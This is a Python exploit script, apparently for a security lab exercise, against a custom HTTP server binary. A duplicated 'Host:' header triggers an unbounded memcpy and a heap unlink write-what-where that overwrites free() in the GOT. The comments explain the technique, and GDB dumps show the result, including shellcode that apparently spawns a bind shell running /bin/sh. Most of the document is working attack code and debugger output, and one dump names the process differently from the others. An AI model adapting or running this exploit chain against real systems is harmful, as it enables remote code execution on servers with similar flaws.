#!/usr/bin/python3

from socket import *
import struct
import sys

addr = '127.0.0.1'
if len(sys.argv) > 1:
    addr = sys.argv[1]

s = socket(AF_INET, SOCK_STREAM)
s.connect((addr, 31337))

#exploit = b"\xeb\xfe"
exploit = ""
with open("exploit64", "rb") as fh:
    exploit = fh.read() #exploit is 150 bytes

'''Ghidra output -- see GDB mirror below
    ...
    FUN_00401db8_parse_header -> contains the unbounded memcpy
    else {
        local_4c = FUN_0040155a(local_60,10);
        local_4c = local_4c + -1;
        memcpy(local_20 + 5,local_60,(long)local_4c); # does a memcpy at 0x28/40B (local_20 == 8B pointer) -- the stucture's data buffer sits at 0x28 --- stuff before are just extra struct members/metadata
        *(int *)(local_20 + 0x4d) = local_4c;
    }
'''

# note: Ghidra - local_38[] is an array of string pointers populated by repeated calls to strtok_r() (lines 42, 48, 54, 60, 62)
# i.e. strtok_r splits client request 'GET /asdf.vbs HTTP/1.1\r\n Host: AAAA\r\n...' into an array of strings
# note: server is written to create/store a hash on new header names (Ghidra - line 67) as they are passed to the server and
# structures for each of the headers are calloc'ed (Ghidra - line 64)

# note: server does a validation check (Ghidra FUN_0040174 - line 69) against existing header name hashes.
# IF header is new, drops into the 'if' (line 70) which contains the BOUNDED memcpy() (line 81) and link list addition (lines 88-89)
# ^^ the ONLY way a header gets added to the linked list of headers is IF it is a NEW header (doesn't match existing hashes)
# if NEW, it is required to do a BOUNDED memcpy() of it's header string ex. Host: AAAA <--

# note: if the header is a REPEAT (i.e. a SECOND Host:), the pointer returned from the check (FUN_0040174 - line 69) will equal the
# pointer of the ORIGINAL header i.e. the first Host: -- the repeated header is NEVER added to the linked list
# ^^ once you point back to the original header, the 'if' check (line 70) is BYPASSED and the 'else' (line 92) is executed
#    to include a VULNERABLE UNBOUNDED memcpy() (line 95) on the ORIGINAL header which allows for a buffer overflow

# - when you provide a 'Host:' then a 'Garbage:' then another 'Host:' the program returns a pointer back to the ORIGINAL 'Host:'
# - there is an UNBOUNDED memcpy() that allows and overflow into the Garbage header to change its next and previous pointers
# - a final check is done AFTER all of this has occurred (Ghidra - lines 101-111)
# - UNSUPPORTED headers (i.e. our Garbage:) is passed to (FUN_004016ae - line 112) to be unlinked enabling the write-what-where

'''note for below: an *additional 0x8B are calloced by the heap manager for chunk 'metadata' as well as an **additional 0x8B at the end to 0xX0 align the chuck

    Host:  0x270/624B from calloc() (Ghidra - line 64)        	Garbage: 0x270/624B from calloc()
    +8B of metadata -- prev size				+8B of metadata -- prev size
    +8B of chuck metadata [size|A|M|P] - user never sees        +8B of chuck metadata [size|A|M|P] - user never sees
    0x0  - forward link (*next)                                 0x0  - forward link (*next)
    0x8  - backward link (*prev)                                0x8  - backward link (*prev)
    0x10 - hash                                                 ...
    0x18 - key
    0x20 - buffer_ptr
    0x28 - struct (buffer) begins here -- note: GAP from start to end of struct is 0x240/584B or 624B (calloc) - 40B (header)
    0x30 - should be bypassed on the unlink overwrite - will contain our 2B jump after the memcpy of 2nd 'Host' header
    0x38 - this will be overwritten on the unlink of the garbage node --- which is why we need the 2B jump at 0x30 above
    ...
    0x270 - end of chunk
'''

# Note: the unlink function will:
	# - go to the GOT index of free()
	# - overwrite the flink/next_ptr (same as free()->addr) with the address of the buffer (+0x28 into 1st Host chunk)
	# - go to the address of the 1st Host chunk's buffer
	# - overwrite the blink/prev_ptr (which would be 8 bytes into the buffer) with the address of the GOT index for free()
			        # note: this will clobber bytes 8-15 of our shellcode if we place it at the start of the buffer!
	# our solution puts a 2-byte jump instruction at the start of the buffer that jumps us past the clobbered area

what_ptr = 0x7ffff0000fc8	# address of exploit located at Host: 0x28
where = 0x405018		# entry of free in got.plt
PADLEN = 584

x = b'GET /asdf.vbs HTTP/1.1\r\n'
x += b'Host: AAAA\r\n'		# legitimate header - string passed in shouldn't matter
x += b'GARBAGE: BBBB\r\n'	# bad header - string passed in shouldn't matter

x += b'Host:' 			# Same as first header
x += b'\xEB\x0E'
     # ^^ jump 14 bytes forward to our shellcode (2 bytes for the jump + 14 padded/clobbered bytes == 16B into the buffer)
x += b'A'*14			# last 8B of this padding are overwritten (with the address of GOT->free() during write-what-where
x += exploit
x += b'A'*(PADLEN - len(exploit))
x += struct.pack("<Q", what_ptr) # next ptr
x += struct.pack("<Q", where) 	# prev ptr
print(x)
x += b'\r\n\r\n'

s.send(x)

# Note - 1st 'Host' contents (' AAAA') is overwritten with 2nd 'Host'/3rd chunk with exploit/shellcode - a little different than a normal unlink!
# ^^ you can see this in GDB as you explore the 2 calloc() and memcpy() calls within the parsing function: 0x401db8
# offsets within header_item
# next - 0h
# prev - 8h
# hash - 10h
# key - 18h
# value - 20h (this points to local_48 + 0x28)
# value_data (local_48 + 0x28) - buffer size of 576 bytes + 8 bytes of alignment padding
# ^^ 624 : calloc'ed amount (0x401f74)
#  +  16 : metadata (8-byte chunk_size & 8-byte prev_chunk_size) - never seen by the user, but added by calloc/malloc()
#  -  40 : for the header plates
#  = 584)

# Note: program memcpy 600B (local_60) of data (2B jump + A's + exploit) into value_data - overflows 16B into garbage chunk
# what_ptr - will be written into the forward link of the garbage chunk
# where_ptr - will be written into the backward link of the garbage chunk

# local_38 (rdi) and local_20 (rsi) @ the call to 0x4016ae
'''
$rsi   : 0x007ffff0001220  →  0x007ffff0000fc8  →  0x4141414141410eeb
$rdi   : 0x007ffff0000f70  →  0x007ffff7dbeee0  →  0x6473612f00544547 ("GET"?)

rdi:
gef➤  x/8s 0x007ffff7dbeee0
0x7ffff7dbeee0:	"GET"
0x7ffff7dbeee4:	"/asdf.vbs"
0x7ffff7dbeeee:	"HTTP/1.1"
0x7ffff7dbeef7:	"\nHost"
0x7ffff7dbeefd:	" AAAA"
0x7ffff7dbef03:	"\nGARBAGE"
0x7ffff7dbef0c:	" BBBB"
0x7ffff7dbef12:	"\nHost"

rsi:
gef➤  x/8s 0x007ffff0000fc8
0x7ffff0000fc8:	"\353\016", 'A' <repeats 14 times>, "H1\300H1\377H1\366H1\322M1\300j\002_j\001^j\006Zj)X\017\005I\211\300M1\322ARAR\306\004$\002f\307D$\002\005\071H\211\346AP_j\020Zj1X\017\005AP_j\001^j2X\017\005H\211\346H1ɱ\020QH\211\342AP_j+X\017\005YM1\311I\211\301L\211\317H1\366j\003^H\377\316j!X\017\005u\366H1\377WW^ZH\277//bin/shH\301\357\bWT_j;X\017\005", 'A' <repeats 410 times>, "h\002"
0x7ffff000120b:	""
0x7ffff000120c:	'A' <repeats 20 times>, "\310\017"
0x7ffff0001223:	"\360\377\177"
0x7ffff0001227:	""
0x7ffff0001228:	"\030P@"
0x7ffff000122c:	""
0x7ffff000122d:	""
'''

'''
gef➤  si
0x000000000040170e in ?? ()

[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00000000405018  →  0x00000000401036  →  0xffe0e90000000068 ("h"?)
$rbx   : 0x0
$rcx   : 0x0
$rdx   : 0x007ffff0000fc8  →  0x4141414141410eeb
$rsp   : 0x007ffff7dbee20  →  0x007ffff0001220  →  0x007ffff0000fc8  →  0x4141414141410eeb
$rbp   : 0x007ffff7dbee30  →  0x007ffff7dbeeb0  →  0x007ffff7dbfef0  →  0x0000000000000000
$rsi   : 0x007ffff0001220  →  0x007ffff0000fc8  →  0x4141414141410eeb
$rdi   : 0x007ffff0000f70  →  0x007ffff7dbeee0  →  0x6473612f00544547 ("GET"?)
$rip   : 0x0000000040170e  →   mov QWORD PTR [rax], rdx
$r8    : 0x0
$r9    : 0x2d
$r10   : 0x007ffff7dbef04  →  0x45474142524147 ("GARBAGE"?)
$r11   : 0x0
$r12   : 0x007fffffffd27e  →  0x0000000000000100
$r13   : 0x007fffffffd27f  →  0x0000000000000001
$r14   : 0x007fffffffd280  →  0x0000000000000000
$r15   : 0x007ffff7dbffc0  →  0x0000000000000000
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x007ffff7dbee20│+0x0000: 0x007ffff0001220  →  0x007ffff0000fc8  →  0x4141414141410eeb	 ← $rsp
0x007ffff7dbee28│+0x0008: 0x007ffff0000f70  →  0x007ffff7dbeee0  →  0x6473612f00544547 ("GET"?)
0x007ffff7dbee30│+0x0010: 0x007ffff7dbeeb0  →  0x007ffff7dbfef0  →  0x0000000000000000	 ← $rbp
0x007ffff7dbee38│+0x0018: 0x00000000402184  →   test eax, eax
0x007ffff7dbee40│+0x0020: 0x007ffff7dbeed8  →  0x007ffff0000f70  →  0x007ffff7dbeee0  →  0x6473612f00544547 ("GET"?)
0x007ffff7dbee48│+0x0028: 0x007ffff7dbeee0  →  0x6473612f00544547 ("GET"?)
0x007ffff7dbee50│+0x0030: 0x007ffff7dbf182  →  0x00000000000a0d ("\r\n"?)
0x007ffff7dbee58│+0x0038: 0x007ffff7dbef18  →  0x4141414141410eeb
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x401703                  mov    rax, QWORD PTR [rax+0x8]
     0x401707                  mov    rdx, QWORD PTR [rbp-0x10]
     0x40170b                  mov    rdx, QWORD PTR [rdx]
 →   0x40170e                  mov    QWORD PTR [rax], rdx
     0x401711                  mov    rax, QWORD PTR [rbp-0x10]
     0x401715                  mov    rdi, rax
     0x401718                  call   0x401030 <free@plt>
     0x40171d                  mov    eax, 0x1
     0x401722                  leave
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "webserver_lab9", stopped 0x7ffff7f9bb0f in __libc_accept (), reason: SINGLE STEP
[#1] Id 2, Name: "webserver_lab9", stopped 0x40170e in ?? (), reason: SINGLE STEP
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x40170e → mov QWORD PTR [rax], rdx
[#1] 0x402184 → test eax, eax
[#2] 0x402338 → test eax, eax
[#3] 0x7ffff7f924c0 → start_thread(arg=<optimized out>)
[#4] 0x7ffff7ec0133 → clone()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  got

GOT protection: Partial RelRO | GOT functions: 27

[0x405018] free@GLIBC_2.2.5  →  0x401036                       <-------------------- free() is still unresolved
[0x405020] recv@GLIBC_2.2.5  →  0x7ffff7f9bc00
[0x405028] pthread_create@GLIBC_2.2.5  →  0x7ffff7f927a0
[0x405030] puts@GLIBC_2.2.5  →  0x401066
[0x405038] setsockopt@GLIBC_2.2.5  →  0x7ffff7ec1750
[0x405040] strlen@GLIBC_2.2.5  →  0x401086
[0x405048] send@GLIBC_2.2.5  →  0x401096
[0x405050] printf@GLIBC_2.2.5  →  0x7ffff7e172e0
[0x405058] snprintf@GLIBC_2.2.5  →  0x7ffff7e173b0
[0x405060] gai_strerror@GLIBC_2.2.5  →  0x4010c6
[0x405068] strncat@GLIBC_2.2.5  →  0x4010d6
[0x405070] close@GLIBC_2.2.5  →  0x4010e6
[0x405078] strtok_r@GLIBC_2.2.5  →  0x7ffff7e4f5f0
[0x405080] calloc@GLIBC_2.2.5  →  0x7ffff7e4b6d0
[0x405088] strcmp@GLIBC_2.2.5  →  0x401116
[0x405090] fprintf@GLIBC_2.2.5  →  0x401126
[0x405098] memcpy@GLIBC_2.14  →  0x7ffff7f231c0
[0x4050a0] listen@GLIBC_2.2.5  →  0x7ffff7ec12b0
[0x4050a8] bind@GLIBC_2.2.5  →  0x7ffff7ec1150
[0x4050b0] perror@GLIBC_2.2.5  →  0x401166
[0x4050b8] accept@GLIBC_2.2.5  →  0x7ffff7f9bac0
[0x4050c0] strcat@GLIBC_2.2.5  →  0x401186
[0x4050c8] exit@GLIBC_2.2.5  →  0x401196
[0x4050d0] fwrite@GLIBC_2.2.5  →  0x4011a6
[0x4050d8] getaddrinfo@GLIBC_2.2.5  →  0x7ffff7eaa4c0
[0x4050e0] freeaddrinfo@GLIBC_2.2.5  →  0x7ffff7eaa470
[0x4050e8] socket@GLIBC_2.2.5  →  0x7ffff7ec17b0
gef➤  si
0x0000000000401711 in ?? ()

[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00000000405018  →  0x007ffff0000fc8  →  0x4141414141410eeb
$rbx   : 0x0
$rcx   : 0x0
$rdx   : 0x007ffff0000fc8  →  0x4141414141410eeb
$rsp   : 0x007ffff7dbee20  →  0x007ffff0001220  →  0x007ffff0000fc8  →  0x4141414141410eeb
$rbp   : 0x007ffff7dbee30  →  0x007ffff7dbeeb0  →  0x007ffff7dbfef0  →  0x0000000000000000
$rsi   : 0x007ffff0001220  →  0x007ffff0000fc8  →  0x4141414141410eeb
$rdi   : 0x007ffff0000f70  →  0x007ffff7dbeee0  →  0x6473612f00544547 ("GET"?)
$rip   : 0x00000000401711  →   mov rax, QWORD PTR [rbp-0x10]
$r8    : 0x0
$r9    : 0x2d
$r10   : 0x007ffff7dbef04  →  0x45474142524147 ("GARBAGE"?)
$r11   : 0x0
$r12   : 0x007fffffffd27e  →  0x0000000000000100
$r13   : 0x007fffffffd27f  →  0x0000000000000001
$r14   : 0x007fffffffd280  →  0x0000000000000000
$r15   : 0x007ffff7dbffc0  →  0x0000000000000000
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x007ffff7dbee20│+0x0000: 0x007ffff0001220  →  0x007ffff0000fc8  →  0x4141414141410eeb	 ← $rsp
0x007ffff7dbee28│+0x0008: 0x007ffff0000f70  →  0x007ffff7dbeee0  →  0x6473612f00544547 ("GET"?)
0x007ffff7dbee30│+0x0010: 0x007ffff7dbeeb0  →  0x007ffff7dbfef0  →  0x0000000000000000	 ← $rbp
0x007ffff7dbee38│+0x0018: 0x00000000402184  →   test eax, eax
0x007ffff7dbee40│+0x0020: 0x007ffff7dbeed8  →  0x007ffff0000f70  →  0x007ffff7dbeee0  →  0x6473612f00544547 ("GET"?)
0x007ffff7dbee48│+0x0028: 0x007ffff7dbeee0  →  0x6473612f00544547 ("GET"?)
0x007ffff7dbee50│+0x0030: 0x007ffff7dbf182  →  0x00000000000a0d ("\r\n"?)
0x007ffff7dbee58│+0x0038: 0x007ffff7dbef18  →  0x4141414141410eeb
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x401707                  mov    rdx, QWORD PTR [rbp-0x10]
     0x40170b                  mov    rdx, QWORD PTR [rdx]
     0x40170e                  mov    QWORD PTR [rax], rdx          <--------- this step overwrites free() with pointer to exploit
 →   0x401711                  mov    rax, QWORD PTR [rbp-0x10]
     0x401715                  mov    rdi, rax
     0x401718                  call   0x401030 <free@plt>
     0x40171d                  mov    eax, 0x1
     0x401722                  leave
     0x401723                  ret
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "webserver_lab9", stopped 0x7ffff7f9bb0f in __libc_accept (), reason: SINGLE STEP
[#1] Id 2, Name: "webserver_lab9", stopped 0x401711 in ?? (), reason: SINGLE STEP
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x401711 → mov rax, QWORD PTR [rbp-0x10]
[#1] 0x402184 → test eax, eax
[#2] 0x402338 → test eax, eax
[#3] 0x7ffff7f924c0 → start_thread(arg=<optimized out>)
[#4] 0x7ffff7ec0133 → clone()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  got

GOT protection: Partial RelRO | GOT functions: 27

[0x405018] free@GLIBC_2.2.5  →  0x7ffff0000fc8      <-------------------- free() is now resolved with pointer to exploit after call to our unlink function (Ghidra FUN_004016ae - line 112)
[0x405020] recv@GLIBC_2.2.5  →  0x7ffff7f9bc00
[0x405028] pthread_create@GLIBC_2.2.5  →  0x7ffff7f927a0
[0x405030] puts@GLIBC_2.2.5  →  0x401066
[0x405038] setsockopt@GLIBC_2.2.5  →  0x7ffff7ec1750
[0x405040] strlen@GLIBC_2.2.5  →  0x401086
[0x405048] send@GLIBC_2.2.5  →  0x401096
[0x405050] printf@GLIBC_2.2.5  →  0x7ffff7e172e0
[0x405058] snprintf@GLIBC_2.2.5  →  0x7ffff7e173b0
[0x405060] gai_strerror@GLIBC_2.2.5  →  0x4010c6
[0x405068] strncat@GLIBC_2.2.5  →  0x4010d6
[0x405070] close@GLIBC_2.2.5  →  0x4010e6
[0x405078] strtok_r@GLIBC_2.2.5  →  0x7ffff7e4f5f0
[0x405080] calloc@GLIBC_2.2.5  →  0x7ffff7e4b6d0
[0x405088] strcmp@GLIBC_2.2.5  →  0x401116
[0x405090] fprintf@GLIBC_2.2.5  →  0x401126
[0x405098] memcpy@GLIBC_2.14  →  0x7ffff7f231c0
[0x4050a0] listen@GLIBC_2.2.5  →  0x7ffff7ec12b0
[0x4050a8] bind@GLIBC_2.2.5  →  0x7ffff7ec1150
[0x4050b0] perror@GLIBC_2.2.5  →  0x401166
[0x4050b8] accept@GLIBC_2.2.5  →  0x7ffff7f9bac0
[0x4050c0] strcat@GLIBC_2.2.5  →  0x401186
[0x4050c8] exit@GLIBC_2.2.5  →  0x401196
[0x4050d0] fwrite@GLIBC_2.2.5  →  0x4011a6
[0x4050d8] getaddrinfo@GLIBC_2.2.5  →  0x7ffff7eaa4c0
[0x4050e0] freeaddrinfo@GLIBC_2.2.5  →  0x7ffff7eaa470
[0x4050e8] socket@GLIBC_2.2.5  →  0x7ffff7ec17b0

...

gef➤  si
0x0000000000401718 in ?? ()

[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x007ffff0001220  →  0x007ffff0000fc8  →  0x4141414141410eeb
$rbx   : 0x0
$rcx   : 0x0
$rdx   : 0x007ffff0000fc8  →  0x4141414141410eeb
$rsp   : 0x007ffff7dbee20  →  0x007ffff0001220  →  0x007ffff0000fc8  →  0x4141414141410eeb
$rbp   : 0x007ffff7dbee30  →  0x007ffff7dbeeb0  →  0x007ffff7dbfef0  →  0x0000000000000000
$rsi   : 0x007ffff0001220  →  0x007ffff0000fc8  →  0x4141414141410eeb
$rdi   : 0x007ffff0001220  →  0x007ffff0000fc8  →  0x4141414141410eeb
$rip   : 0x00000000401718  →   call 0x401030 <free@plt>
$r8    : 0x0
$r9    : 0x2d
$r10   : 0x007ffff7dbef04  →  0x45474142524147 ("GARBAGE"?)
$r11   : 0x0
$r12   : 0x007fffffffd27e  →  0x0000000000000100
$r13   : 0x007fffffffd27f  →  0x0000000000000001
$r14   : 0x007fffffffd280  →  0x0000000000000000
$r15   : 0x007ffff7dbffc0  →  0x0000000000000000
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x007ffff7dbee20│+0x0000: 0x007ffff0001220  →  0x007ffff0000fc8  →  0x4141414141410eeb	 ← $rsp
0x007ffff7dbee28│+0x0008: 0x007ffff0000f70  →  0x007ffff7dbeee0  →  0x6473612f00544547 ("GET"?)
0x007ffff7dbee30│+0x0010: 0x007ffff7dbeeb0  →  0x007ffff7dbfef0  →  0x0000000000000000	 ← $rbp
0x007ffff7dbee38│+0x0018: 0x00000000402184  →   test eax, eax
0x007ffff7dbee40│+0x0020: 0x007ffff7dbeed8  →  0x007ffff0000f70  →  0x007ffff7dbeee0  →  0x6473612f00544547 ("GET"?)
0x007ffff7dbee48│+0x0028: 0x007ffff7dbeee0  →  0x6473612f00544547 ("GET"?)
0x007ffff7dbee50│+0x0030: 0x007ffff7dbf182  →  0x00000000000a0d ("\r\n"?)
0x007ffff7dbee58│+0x0038: 0x007ffff7dbef18  →  0x4141414141410eeb
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x40170e                  mov    QWORD PTR [rax], rdx
     0x401711                  mov    rax, QWORD PTR [rbp-0x10]
     0x401715                  mov    rdi, rax
 →   0x401718                  call   0x401030 <free@plt>
   ↳    0x401030 <free@plt+0>     jmp    QWORD PTR [rip+0x3fe2]        # 0x405018 <free@got.plt>
        0x401036 <free@plt+6>     push   0x0
        0x40103b <free@plt+11>    jmp    0x401020
        0x401040 <recv@plt+0>     jmp    QWORD PTR [rip+0x3fda]        # 0x405020 <recv@got.plt>
        0x401046 <recv@plt+6>     push   0x1
        0x40104b <recv@plt+11>    jmp    0x401020
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
free@plt (
   $rdi = 0x007ffff0001220 → 0x007ffff0000fc8 → 0x4141414141410eeb,
   $rsi = 0x007ffff0001220 → 0x007ffff0000fc8 → 0x4141414141410eeb,
   $rdx = 0x007ffff0000fc8 → 0x4141414141410eeb
)
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "webserver3", stopped 0x7ffff7f9bb0f in __libc_accept (), reason: SINGLE STEP
[#1] Id 2, Name: "webserver3", stopped 0x401718 in ?? (), reason: SINGLE STEP
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x401718 → call 0x401030 <free@plt>
[#1] 0x402184 → test eax, eax
[#2] 0x402338 → test eax, eax
[#3] 0x7ffff7f924c0 → start_thread(arg=<optimized out>)
[#4] 0x7ffff7ec0133 → clone()
'''
